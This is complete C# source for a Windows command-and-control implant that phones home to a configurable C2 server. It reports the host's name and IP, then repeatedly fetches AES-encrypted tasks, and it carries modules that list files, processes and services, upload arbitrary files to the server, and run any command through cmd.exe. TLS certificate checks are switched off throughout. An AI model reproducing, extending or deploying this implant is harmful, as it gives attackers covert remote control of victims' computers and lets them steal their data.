using System;
using System.Timers;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Management;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Threading;
using System.IO;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using System.ServiceProcess;
using AddressFamily = System.Net.Sockets.AddressFamily;
using System.DirectoryServices.ActiveDirectory;

namespace Impl4n7
{
	public class Program
	{

        static string xaes_key = "AAAAAAAAAAAAAAAA"; // change on server and client-side to match. can leave "as is" if desired.
        static string xaes_iv = "BBBBBBBBBBBBBBBB";  // change on server and client-side to match. can leave "as is" if desired.
        static string c2redirector = "https://your.c2.server.info.goes.here.com/";
        static string hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
        static int guid = Util.GetRandom();

    	public static void Main()
		{

			//Console.WriteLine("Hello from Main/Checkin");
			
			var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    
                    string ipAddr = ip.ToString();
                    
                    //Console.WriteLine("IP Address = " + ipAddr);
                    //Console.WriteLine(ipAddr);

                    try

                    {
                    	var domainName = Domain.GetComputerDomain();
						//Console.WriteLine(domainName);
                    }

                    catch
                    {
                    	//Console.WriteLine("domain catch");
                    }

                    finally
                    {

                    }

					Checkin(hostname, guid, ipAddr);

                }
            

			

			}


			

			System.Timers.Timer timer = new System.Timers.Timer(TimeSpan.FromMinutes(.05).TotalMilliseconds);
			timer.AutoReset = true;
			timer.Elapsed += new System.Timers.ElapsedEventHandler(RepeatThis);
			timer.Start();
			Console.ReadLine();
			
			
		}
		

		public static void RepeatThis(object sender, ElapsedEventArgs e)
		{
			
			try
			{
				GetTask();
			}

			catch
			{
				//Console.WriteLine("Catch from RepeatThis method");
			}
			
		}



		public static void GetIP()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    
                    string ipAddr = ip.ToString();
                    //Console.WriteLine("IP Address = " + ipAddr);
                    
                }
            }
        }

		public static class Util
        {
            private static Random rnd = new Random();
            public static int GetRandom()
            {
                return rnd.Next();
            }

        }

	   

		public static void GetTask()
		{
			
			
			ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
				
			var TaskToRun = string.Empty;
		    var webClient = new System.Net.WebClient();
		    
		    TaskToRun = webClient.DownloadString(c2redirector + guid + "/image.php?action=view");
		    //Console.WriteLine("Task to be run: " + TaskToRun);

		    
		    string DecryptedTaskToRun = DecryptAES(TaskToRun);
		    //Console.WriteLine("Decrypted Task: " + DecryptedTaskToRun);


		    // Various tasks that can be run/added, below

		    if (DecryptedTaskToRun == "null")
				
				{
				    //Console.WriteLine("Waiting for new command. Not proceeding.");
				    return;
				}

			if (DecryptedTaskToRun.Contains("dir"))
				
				{
					DirModule(DecryptedTaskToRun);
				}

			if (DecryptedTaskToRun.Contains("runningTasks"))
                
                {
                	RunningTasksModule();
                }

            if (DecryptedTaskToRun.Contains("runningServices"))
                
                {
                	RunningServicesModule();
                }

            if (DecryptedTaskToRun.Contains("serviceInfo"))
                
                {
                	ServiceInfoModule(DecryptedTaskToRun);
                }

            if (DecryptedTaskToRun.Contains("download"))
                
                {
                	DownloadModule(DecryptedTaskToRun);
                }

            if (DecryptedTaskToRun.Contains("shell"))
                
                {
                	ShellModule(DecryptedTaskToRun);
                }

		}

		
		private static void DirModule(string xDir)
        {

            try
            {
            	
            	xDir = xDir.Substring(xDir.IndexOf(' ') + 1);
            	var targetDirectory = xDir;
            	string[] fileEntries = Directory.GetFileSystemEntries(targetDirectory);
            	string results = string.Empty;

            	foreach(var fileName in fileEntries)
            	    results += "\n" + fileName;

            	//Console.WriteLine(results);
            	Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in dirModule");
            }


        }


        private static void RunningTasksModule()
        {

            try
            {
            	
            	var ProcList = Process.GetProcesses();
            	string results = string.Empty;

            	foreach(var proc in ProcList)
            	    results += "\n" + "Process Name: " + proc.ProcessName + ", " + "PID: " + proc.Id;

            	//Console.WriteLine(results);

            	Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in RunningTasksModule");
            }


        }

        private static void RunningServicesModule()
        {

            try
            {
            	
            	var sController = ServiceController.GetServices();
            	string results = string.Empty;

            	foreach (var sc in sController)
            	    results += "\n" + sc.ServiceName;
            	
            	//Console.WriteLine(results);

            	Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in RunningServicesModule");
            }


        }

        private static void ServiceInfoModule(string xService)
        {

            try
            {
            	
            	xService = xService.Substring(xService.IndexOf(' ') + 1);
            	string serviceName = xService;
            	string results = string.Empty;                
            	
            	using (ManagementObject wmiService = new ManagementObject("Win32_Service.Name='"+ serviceName +"'"))
            	{
            	    wmiService.Get();
            	    string n = wmiService["Name"].ToString();
            	    string d = wmiService["Description"].ToString();
            	    string s1 = wmiService["State"].ToString();
            	    string s2 = wmiService["Status"].ToString();
            	    string p = wmiService["PathName"].ToString();
            	    
            	    results = "\n" + "Name: " + n +
            	              "\n" + "Description: " + d +
            	              "\n" + "State: " + s1 +
            	              "\n" + "Status: " + s2 +
            	              "\n" + "PathName: " + p;
            	    //Console.WriteLine(results);


            	}

            	Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in ServiceInfoModule");
            }


        }

        private static void DownloadModule(string xDownload)
        {

            try
            {
            	
            	ServicePointManager.Expect100Continue = true;
            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            	xDownload = xDownload.Substring(xDownload.IndexOf(' ') + 1);
            	var fileName = xDownload;
            	
            	byte[] bytes = File.ReadAllBytes(fileName);
            	string base64 = System.Convert.ToBase64String(bytes);
            	
            	string tmpFile = fileName + ".tmp";

            	File.WriteAllText (tmpFile, base64);

            	String uriString = c2redirector + "api";
            	WebClient myWebClient = new WebClient();
            	
            	try
            	{
            	    byte[] responseArray = myWebClient.UploadFile(uriString, "POST", tmpFile);
            	    File.Delete(tmpFile);
            	    
            	}

            	catch
            	{
            		//Console.WriteLine("DownloadModule catch");
            	}

            	finally
            	{
            		File.Delete(tmpFile);
            	}
            	

            }

            catch (Exception)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                //Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in main DownloadModule");
            	
            }


        }

        private static void ShellModule(string xShell)
        {

            try
            {
            	
            	xShell = xShell.Substring(xShell.IndexOf(' ') + 1);

            	Process p = new Process();
            	
            	// Redirect the output stream of the child process.
            	p.StartInfo.UseShellExecute = false;
            	p.StartInfo.RedirectStandardOutput = true;
            	p.StartInfo.FileName = "cmd.exe";
            	p.StartInfo.Arguments = "/c" + xShell;
            	p.Start();

            	string results = p.StandardOutput.ReadToEnd();
            	
            	//Console.WriteLine(results);

            	Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
            	//Console.WriteLine("finally block in ShellModule");
            }


        }


		
        private static void Checkin(string xHostname, int xuID, string xipAddr)
        {

            try
            {

            	//Console.WriteLine("hello from Checkin");

            	ServicePointManager.Expect100Continue = true;
            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                
            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
                
                byte[] encrypted = EncryptStringToBytes(xHostname, aes_key, aes_iv);

                // Encrypt the string to an array of bytes.
                string str_encrypted = EncryptAES(xHostname + "," + guid + "," + xipAddr);

                //Console.WriteLine("Encrypted: {0}", str_encrypted);

                var request = (HttpWebRequest)WebRequest.Create(c2redirector + "checkin");
                var postData = Uri.EscapeDataString(str_encrypted);
                var data = Encoding.ASCII.GetBytes(postData);

                 
                request.Method = "POST";
                request.ContentType = "text/plain";
                request.ContentLength = data.Length;

                try {

                        using (var stream = request.GetRequestStream())
                        {
                         stream.Write(data, 0, data.Length);
                        }

                        var response = (HttpWebResponse)request.GetResponse();
                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

                        GetTask();
                     
                     
                    }

                catch (Exception)
                    {
                    	
                    	//Console.WriteLine("Error: {0}", e.Message);
                    	//Post(e.Message);
                    	return;
                    }


                
            }
            catch (Exception e)
            {
                Post(e.Message);
                //Console.WriteLine("Error: {0}", e.Message);
            }


            
        }

		private static void Post(string ResultsToPost)
        {

            try
            {

            	//Console.WriteLine("hello from Post");
            	ServicePointManager.Expect100Continue = true;
            	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                
            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
                
                byte[] encrypted = EncryptStringToBytes(ResultsToPost, aes_key, aes_iv);

                // Encrypt the string to an array of bytes.
                string str_encrypted = EncryptAES("[" + guid + "] " + ResultsToPost);

                //Console.WriteLine("Encrypted: {0}", str_encrypted);

                var request = (HttpWebRequest)WebRequest.Create(c2redirector + "results");
                var postData = Uri.EscapeDataString(str_encrypted);
                var data = Encoding.ASCII.GetBytes(postData);

                 
                request.Method = "POST";
                request.ContentType = "text/plain";
                request.ContentLength = data.Length;

                try {

                        using (var stream = request.GetRequestStream())
                        {
                         stream.Write(data, 0, data.Length);
                        }

                        var response = (HttpWebResponse)request.GetResponse();
                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                     
                    }

                catch (Exception)
                    {
                    	//Post(e.Message);
                    	//Console.WriteLine("Error: {0}", e.Message);
                    	return;
                    }
                
            }
            catch (Exception e)
            {
                Post(e.Message);
                //Console.WriteLine("Error: {0}", e.Message);
            }

            
        }

        


        public static string EncryptAES(string plainText)
        {
            byte[] encrypted;

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {

            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);

                aes.Key = aes_key;
                aes.IV = aes_iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform enc = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }

                        encrypted = ms.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(encrypted);
        }

        static byte[] EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
        {
            
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("Key");
            byte[] encrypted;
         
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);

                
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {

                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            return encrypted;

        }


        public static string DecryptAES(string encryptedText)
        {
            string decrypted = null;
            byte[] cipher = Convert.FromBase64String(encryptedText);

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
            	byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
            	byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);

                aes.Key = aes_key;
                aes.IV = aes_iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform dec = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            decrypted = sr.ReadToEnd();
                        }
                    }
                }
            }

            return decrypted;
        }


        static string DecryptStringFromBytes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("Key");

            string plaintext = null;

            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;

        }






	}
}